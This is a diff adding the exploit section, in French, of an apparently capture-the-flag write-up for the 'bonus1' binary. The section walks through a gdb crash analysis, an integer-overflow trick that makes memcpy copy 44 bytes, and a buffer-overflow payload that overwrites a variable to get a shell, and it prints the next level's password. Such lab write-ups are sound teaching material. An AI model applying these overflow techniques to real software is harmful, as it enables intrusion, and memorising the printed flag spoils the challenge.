@@ -116,3 +116,68 @@
     - Return 0
     - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
 ## Exploit
+
+Après analyse, nous comprenons que pour obtenir notre flag il faut donner en input un nombre dont la valeur doit être inférieure ou égale à 9. Plus loin, cette valeur doit être égale a 0x574f4c46 (1464814662).
+
+Nous voyons aussi que le memcpy() n'est pas protegé en effet notre string b fait 40, et si notre argv[2] fait plus de 40 nous avons un SegFault. 
+
+- `gdb bonus1`
+  - `set disassembly-flavor intel`
+  - `r -2 $(python -c 'print "A" * 44')`
+    ```
+    Program received signal SIGSEGV, Segmentation fault.
+    0xb7f65ef5 in ?? () from /lib/i386-linux-gnu/libc.so.6
+    ```
+  - `info registers`
+    ```
+    (gdb) info registers
+    eax            0xbfffff8a       -1073741942
+    ecx            0xfffffddc       -548
+    edx            0xbffffd80       -1073742464
+    ebx            0xb7fd0ff4       -1208152076
+    esp            0xbffffbc8       0xbffffbc8
+    ebp            0xbffffc18       0xbffffc18
+    esi            0x0      0
+    edi            0x0      0
+    eip            0xb7f65ef5       0xb7f65ef5
+    eflags         0x210282 [ SF IF RF ID ]
+    cs             0x73     115
+    ss             0x7b     123
+    ds             0x7b     123
+    es             0x7b     123
+    fs             0x0      0
+    gs             0x33     51
+    ```
+
+b fait une taille de 40 et en reecrivant jusqu'a 44 nous réécrivons a.
+Pour avoir notre shell notre a doit valoir 0x574f4c46 (1464814662), ca sera donc notre second argument:
+```c
+$(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
+```
+
+Maintenant le souci que nous avons est que la taille copiée par notre memcpy est de maximum 9 * 4 = 36 mais de notre côté nous voulons copier une taille de 44.
+
+Un nombre negatif multiplié par 4 donne toujours un nombre negatif, cependant nous sommes en presence d'integer et nous avons :
+
+**INT_MIN**  = -2147483647 - 1
+**INT_MAX** = 2147483647
+
+La raison de cette difference est la présence d'un bit de signe et nous pouvons abuser de cette particularité pour avoir une valeur supérieure à int min ce qui va passer tous les bit a 1 dont le bit de signe: c'est un [integer overflow](https://fr.wikipedia.org/wiki/D%C3%A9passement_d%27entier). 
+
+Nous utilisons donc [le code python suivant](https://stackoverflow.com/questions/47100105/forcing-integer-overflow-in-python) pour forcer le cast en int et trouver la valeur avec laquelle nous obtenons un integer overflow pour avoir la valeur 44.
+```python
+>>> print((-2147483637*4) % 2**32)
+44
+```
+
+- `./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')`
+  ```
+  ```
+  - `whoami`
+    ```
+    bonus2
+    ```
+  - `cat /home/user/bonus2/.pass`
+    ```
+    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+    ```
